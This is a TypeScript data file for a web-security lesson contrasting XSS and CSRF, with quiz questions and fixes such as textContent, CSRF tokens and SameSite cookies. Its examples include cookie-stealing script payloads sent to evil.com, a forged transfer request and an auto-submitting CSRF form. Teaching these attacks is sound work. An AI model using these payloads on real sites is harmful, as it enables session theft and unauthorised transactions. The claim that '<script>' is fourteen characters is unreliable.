import type { LessonData } from "../types";

const content: LessonData = {
  num: 11,
  orderIndex: 6,
  phaseLabel: "SECURITY + AUTH PATTERNS",
  title: "Two ways to abuse a logged-in browser: XSS and CSRF",
  minutes: 20,
  concept:
    "Cross-Site Scripting (XSS) happens when an attacker gets their own code injected into content that your app later renders as real HTML on someone else's page. If a comments section stores whatever a user typed and later does commentEl.innerHTML = comment, the browser doesn't display that comment as text — it parses it as HTML and executes anything it finds, including a <script> tag. That means a comment like \"<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>\" runs inside the browser of every single person who views the page, using that page's own origin — which lets it read cookies, make authenticated requests as that victim, or rewrite the page entirely. This is why it matters whether the injected content came from a database (stored XSS, served to every future visitor) or was reflected straight back from something like a URL parameter (reflected XSS, affecting only whoever clicks a crafted link) — either way, the fix is the same: never let user-controlled text become HTML that the browser parses. Assigning it to textContent instead of innerHTML, or running it through a proper sanitizer/escaper, makes the browser treat \"<script>\" as the literal four-teen characters it is rather than as a tag to execute. Cross-Site Request Forgery (CSRF) is a completely different mechanism that happens to target the same kind of victim: someone who's already logged into a real site. A malicious page — hosted anywhere, with no injection into the real site required at all — includes a form (often invisible) that targets that real site's endpoint, and auto-submits itself the moment the victim's browser loads the malicious page. Because browsers automatically attach a site's cookies to any request sent to that site, regardless of which page triggered the request, the real site sees what looks like a completely legitimate, authenticated request and processes it — transferring money, changing an email, whatever the form was built to do. The classic defense is a CSRF token: the real site embeds a random, unpredictable value in its own forms and requires that exact value to come back on submission. An attacker's page on a different origin has no way to read or guess that token, because it was never loaded from the real site in the first place, so its forged request gets rejected. Modern apps add a second layer on top of tokens: marking session cookies SameSite=Lax or SameSite=Strict, which tells the browser not to attach that cookie to requests originating from another site at all.",
  conceptSimpler:
    "XSS is like someone sneaking a fake announcement onto a bulletin board everyone trusts, so anyone who reads it unknowingly follows the attacker's instructions instead of the real ones. CSRF is like a con artist mailing you a form that's already addressed and stamped to your own bank, betting the bank will process it automatically the moment it arrives — without ever asking whether you actually meant to send it.",
  vizStages: [
    {
      label: "1. XSS: injecting code into someone else's page",
      body:
        "A comment field stores whatever the user typed, and the page later inserts it directly into the DOM with innerHTML. The browser doesn't know this text is untrusted — it just parses it as real HTML.",
      code:
        "const comment = \"<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>\";\ncommentEl.innerHTML = comment;\n// the browser parses this as an actual <script> tag and RUNS it",
    },
    {
      label: "2. The victim's browser runs the attacker's code",
      body:
        "When another visitor simply loads the page containing this stored comment, their browser executes the script as if it were part of the trusted page — because, as far as the browser is concerned, it is part of the page.",
      code:
        "// runs inside the VICTIM's browser tab, under the site's own origin\nfetch(\"https://evil.com/steal?c=\" + document.cookie);\n// or, worse, silently acts on the victim's behalf:\nfetch(\"/api/transfer\", { method: \"POST\", body: JSON.stringify({ to: \"attacker\", amount: 500 }) });",
    },
    {
      label: "3. The fix: never let user input become executable HTML",
      body:
        "Assigning the same string to textContent instead of innerHTML tells the browser to display the literal characters, not parse them as elements — so a <script> tag just shows up as visible text and never runs.",
      code:
        "// vulnerable\ncommentEl.innerHTML = comment;\n\n// fixed — renders as plain text, never parsed as HTML\ncommentEl.textContent = comment;\n// the page now visibly shows \"<script>...</script>\" instead of running it",
    },
    {
      label: "4. CSRF: spending trust the browser already has",
      body:
        "XSS runs attacker code inside the site's own origin. CSRF doesn't inject anything into the real site at all — it abuses the fact that browsers automatically attach a site's cookies to any request sent there, no matter which page triggered it.",
      code:
        "<!-- hosted on evil.com, visited by someone already logged into bank.com -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker-account\">\n  <input type=\"hidden\" name=\"amount\" value=\"5000\">\n</form>\n<script>document.getElementById(\"f\").submit();</script>\n<!-- the browser attaches bank.com's session cookie automatically -->",
    },
    {
      label: "5. A CSRF token closes the gap",
      body:
        "The real bank.com form embeds a random token the server generated and remembers for this session. The server rejects any transfer request missing the exact matching token — and evil.com has no way to read or guess it, since it was never loaded from bank.com.",
      code:
        "<!-- legitimate form, served by bank.com itself -->\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"a92f0e...e91c\">\n  ...\n</form>\n// server: reject unless csrf_token matches the one issued for this user's session",
    },
  ],
  realWorldIntro:
    "In 2005, a MySpace user named Samy Kamkar exploited a stored XSS hole in profile pages to inject a self-propagating script; anyone who merely viewed his profile had the same script silently copied onto their own profile too, quietly adding \"samy is my hero\" and Samy as a friend. Within about 20 hours it had spread to over a million profiles and forced MySpace offline to contain it — a stark demonstration that with stored XSS, simply viewing a page is enough to get infected, no click required.",
  realWorldCode:
    "// the general pattern that made the Samy worm possible: unsanitized profile fields rendered as raw HTML\nprofileHtmlEl.innerHTML = user.aboutMeField; // whatever the user typed becomes real, running HTML\n\n// the fix adopted industry-wide since: sanitize or escape before ever inserting into the DOM\nprofileHtmlEl.textContent = user.aboutMeField; // or run it through an allowlist-based sanitizer first",
  sandbox: {
    kind: "explore",
    instructions:
      "Click through each stage to compare what an attacker actually needs to pull off an XSS attack versus a CSRF attack — and what specifically stops each one.",
    stages: [
      {
        label: "What XSS requires",
        body:
          "The attacker needs to get their payload INTO content the site will later render as HTML for someone else — a comment field, a profile bio, or even a URL parameter the page echoes back unescaped.",
        code:
          "// stored XSS: payload saved in the database, served to every future viewer\ndb.comments.create({ text: \"<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>\" });\n\n// reflected XSS: payload comes from the URL itself, echoed straight back into the page\n// https://framis.dev/search?q=<script>...</script>\n// page renders: \"Results for <script>...</script>\" -> the script runs",
      },
      {
        label: "What CSRF requires",
        body:
          "The attacker needs the victim to already be logged in somewhere, and to load a page the attacker controls — no injection into the target site needed at all.",
        code:
          "<!-- attacker only needs the victim's browser to load this -->\n<img src=\"https://bank.com/transfer?to=attacker&amount=5000\">\n<!-- if bank.com allows state changes via GET, loading this image alone submits it -->",
      },
      {
        label: "Defending against XSS: escape or sanitize, always",
        body:
          "Never assign untrusted text to innerHTML. Use textContent for plain text, or run any HTML you must allow through a strict allowlist-based sanitizer that strips scripts and event handlers.",
        code:
          "// vulnerable\ncommentEl.innerHTML = userComment;\n\n// safe\ncommentEl.textContent = userComment;",
      },
      {
        label: "Defending against CSRF: tokens plus SameSite cookies",
        body:
          "Beyond a per-request CSRF token, marking the session cookie SameSite=Strict or SameSite=Lax tells the browser not to attach it to requests that originate from another site at all — blocking most CSRF attempts before a token is even checked.",
        code:
          "res.cookie(\"sid\", sessionId, { httpOnly: true, secure: true, sameSite: \"strict\" });\n// this cookie is now withheld from requests initiated by other sites",
      },
    ],
  },
  quizQuestion:
    "A comments page inserts each comment directly into the DOM like this. Which attack does this make possible, and why?",
  quizCode:
    "const comment = getUserComment(); // e.g. \"<script>alert(document.cookie)</script>\"\ncommentEl.innerHTML = comment;",
  quizOptions: [
    {
      key: "a",
      label: "CSRF — because the comment could contain a form that silently submits itself to another site",
      correct: false,
    },
    {
      key: "b",
      label: "XSS — innerHTML makes the browser parse and execute the injected HTML/script as if it were part of the trusted page",
      correct: true,
    },
    {
      key: "c",
      label: "Neither — innerHTML only changes the visual styling of an element, it can't execute code",
      correct: false,
    },
  ],
  quizFeedbackCorrect:
    "Right — innerHTML tells the browser \"parse this string as real HTML,\" so a <script> tag (or an onerror handler, or any other executable payload) hidden inside a comment runs with the exact same trust and access as the rest of the page. textContent, or a proper sanitizer, is what prevents this.",
  quizFeedbackIncorrect:
    "Not quite — this is XSS. innerHTML makes the browser parse the string as real HTML rather than treat it as inert text, so any script tags or event handlers hidden inside the comment execute with the page's full trust. CSRF is a separate attack that doesn't require injecting anything into this site at all.",
  takeaway:
    "XSS smuggles executable code into a page so it runs inside a victim's own trusted session — the fix is to never render unsanitized user input as HTML. CSRF abuses the fact that browsers auto-attach cookies to any request regardless of which page triggered it — the fix is unpredictable CSRF tokens plus SameSite cookies. Different mechanisms, same root cause: trusting something without verifying it actually came from where you think.",
};

export default content;
